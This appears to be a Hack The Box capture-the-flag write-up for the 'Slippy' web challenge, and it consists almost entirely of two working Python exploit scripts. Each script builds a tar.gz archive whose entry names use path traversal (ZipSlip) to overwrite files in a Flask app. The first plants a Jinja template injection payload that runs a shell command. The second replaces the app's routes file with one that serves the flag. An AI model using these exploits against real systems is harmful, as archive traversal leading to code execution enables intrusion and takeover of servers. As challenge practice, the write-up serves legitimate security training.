---
layout: single
title: Slippy [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - Template Injection SSTI
  - ZipSlip
---

## Exploit 1 [Template Injection SSTI]

```python
#!/usr/bin/env python
import requests
import io
import time
import tarfile


url="http://139.59.184.216:32493/"
name="../../../../../../../../../../../../../app/application/templates/index.html"


data=b"""
{///{''.__class__.__mro__[1].__subclasses__()[223]('cat flag', shell=True, stdout=-1).communicate()[0] }///}
"""
source_f=io.BytesIO(initial_bytes=data)

fh=io.BytesIO()
with tarfile.open(fileobj=fh, mode="w:gz") as tar:
	info=tarfile.TarInfo(name)
	
	info.size=len(data)
	info.mtime=time.time()
	tar.addfile(info,source_f)
	
with open("test.tar.gz", "wb") as f:
	f.write(fh.getvalue())

s=requests.Session()	
	
r=requests.post(url+"/api/unslippy", files={"file":fh.getvalue()})
print(r.text) 
#print(s.get(url).text)
```

## Exploit 2 

```python
#!/usr/bin/env python
import requests
import io
import time
import tarfile


url="http://139.59.184.216:32493/"
name="../../../../../../../../../../../../../app/application/blueprints/routes.py"


data=b"""
from flask import Blueprint, request, render_template, abort
from application.util import extract_from_archive

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@web.route('/flag')
def flag():
	return open('flag').read()

@api.route('/unslippy', methods=['POST'])
def cache():
    if 'file' not in request.files:
        return abort(400)
    
    extraction = extract_from_archive(request.files['file'])
    if extraction:
        return {"list": extraction}, 200

    return '', 204
"""
source_f=io.BytesIO(initial_bytes=data)

fh=io.BytesIO()
with tarfile.open(fileobj=fh, mode="w:gz") as tar:
	info=tarfile.TarInfo(name)
	
	info.size=len(data)
	info.mtime=time.time()
	tar.addfile(info,source_f)
	
with open("test.tar.gz", "wb") as f:
	f.write(fh.getvalue())

s=requests.Session()	
	
r=requests.post(url+"/api/unslippy", files={"file":fh.getvalue()})
print(r.text) 
```
